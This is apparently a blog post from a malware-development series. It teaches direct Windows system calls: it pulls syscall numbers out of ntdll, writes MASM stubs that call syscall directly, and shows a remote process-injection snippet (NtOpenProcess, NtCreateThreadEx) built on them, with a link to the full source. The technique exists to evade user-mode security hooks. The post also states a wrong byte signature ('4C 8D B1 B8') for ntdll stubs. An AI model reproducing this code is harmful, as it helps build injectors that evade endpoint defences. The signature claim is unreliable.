---
description: Finally I talk about sys calls :)
---

# Direct System Call

## Introduction

Understanding this flow is crucial when dealing with system calls, as they serve as the gateway between user-mode applications and the underlying Windows kernel. As you know, the workings of Windows API functions follow a layered approach, where calls to functions like `OpenProcess` in `kernel32.dll` are redirected to `kernelbase.dll`, which then invokes the corresponding NTAPI function—such as `NtOpenProcess` in `ntdll.dll` which leads to a system call (`syscall`), transitioning execution into kernel mode where the actual operation is performed.

So why bother with the stupid high level stuff , when we can directly do a syscall is what some _gato_ thought.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p><em>What if I just syscall directly ?</em></p></figcaption></figure>

### Theory

Okay so I have given a brief in this post in Winternal(link), but to just give a gist of it, each system call is basically just a number called SSN (system service number) which is what the NTAPI passes to kernel mode where a table SSDT is used to look up for the correct function (SSR) for that SSN and it gets called to then the result being sent back to user mode. We don't need to dive deep into this for now. We can see a pattern in most of the NTAPI functions which would look similar to this

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```nasm
mov r10, rcx
mov eax, [ssn]
test byte ptr ds:[addr], 1
jne there ----+
syscall       |
ret           |
int 2E  <-----+
ret
```

So the first thing it does is to save the value in `rcx` register to `r10`. This is required because, in x64 syscall convention, `rcx` is not preserved across the `syscall` instruction, so Windows stores it in `r10` for safe access. Then it moves the **SSN** to eax and does a test on a kernel variable, this is done in order to check if the system is x64 / x86 and based on that, the particular syscall is done (Older systems used `int 0x2E` for syscall) and the execution is passed to kernel mode.

### Direct System Calls

Okay so as we know that to invoke a syscall, an SSN is really important, so we would have to get the SSN for the NT functions we want to use. This can easily be done by getting the address of that NT function inside NTDLL. Since we know that every function starts with the `4C 8D B1 B8` hex, we can use this to our advantage and get the **SSN** for our function.  After which is just the same thing , setting up arguments & invoking the syscall.&#x20;

<pre class="language-c"><code class="lang-c">DWORD get_sysn(HMODULE ntHandle, LPCSTR fnName) {

    DWORD               ssn = 0;
    UINT_PTR    NtfnAddress = NULL;

    NtfnAddress = GetProcAddress(ntHandle, fnName);
    if ((PVOID)NtfnAddress == NULL) {
        warn("Resource Locator Failed with  @-->0x%d", GetLastError());
        return 0;
    }

    ssn = (DWORD)((PBYTE)(NtfnAddress + 0x4))[0];
    return ssn;
}

<strong>DWORD    dwNtOpenProcess = get_sysn(ntdllModule, "NtOpenProcess");
</strong>DWORD    dwNtAllocateVirtualMemory = get_sysn(ntdllModule, "NtAllocateVirtualMemory");
....
</code></pre>

Since we know what the first 4 bytes would be , we can directly skip through them and get the first byte after it (look at the pic ) which would be our SSN for the particular function. Also since the compiler doesn't know about these functions, we would have to tell it to look for it externally and write an assembly code with the same thing. I have created a [helper.h](https://github.com/ZzN1NJ4/Malware-Development/blob/main/isystemcalls/helper.h) and included every thing in it, like the structures / function prototypes etc, which are required.

{% code title="helper.h" %}
```c
extern NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL
);
```
{% endcode %}

Then we also have to create an assembly file and link it with our project so that the compiler knows where to look for those functions.&#x20;

{% code title="sys.asm" %}
```nasm
.data
EXTERN dwNtOpenProcess:DWORD;
EXTERN dwNtAllocateVirtualMemory:DWORD;

.code
NtOpenProcess PROC
                mov r10, rcx
                mov eax, dwNtOpenProcess
                syscall
                ret
NtOpenProcess ENDP

NtAllocateVirtualMemory PROC
                mov r10, rcx
                mov eax, dwNtAllocateVirtualMemory
                syscall
                ret
NtAllocateVirtualMemory ENDP
....
END
```
{% endcode %}

after we have written our asm file, we would have to link it with our project , to do that right click on the project in solution explorer and add a build dependency -> masm. Then just make sure that the file sys.asm is being included in the build and is also of type "Microsoft Macro Assembler" (right click on file name -> properties)

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Alright, now we have setup the assembly to run, all that's left is just the same NTAPI process injection. I dont want to fill this blog with a long code of me doing the same thing again so if you want to see it, you can check out the code in [my github](https://github.com/ZzN1NJ4/Malware-Development/blob/main/isystemcalls/main.c). Here's a snippet (as you can see this is very similar to the NTAPI implementation)

```c
STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
if (STATUS != STATUS_SUCCESS) {
    warn("NtOpenProcess failed with  @-->%d || STATUS @--0x%x", GetLastError(), STATUS);
    goto deadend;
}
....
STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
....
STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);

```

### Explanation

What happens here is that we first get the **SSN** of the functions and save it to respective variables. Then we use those same variable in the assembly file and once again use the `extern` keyword in the assembly so that the compiler knows to look for it in an external source (which is our C file).&#x20;

When we call the `NtOpenProcess` function, the compiler starts looking for it outside since we have defined it with the `extern` keyword and finds it in the assembly file and then invokes that function.

## References

* [https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls)
* [https://medium.com/@amitmoshel70/intro-to-syscalls-windows-internals-for-malware-development-pt-2-b8d88bb10eb9](https://medium.com/@amitmoshel70/intro-to-syscalls-windows-internals-for-malware-development-pt-2-b8d88bb10eb9)

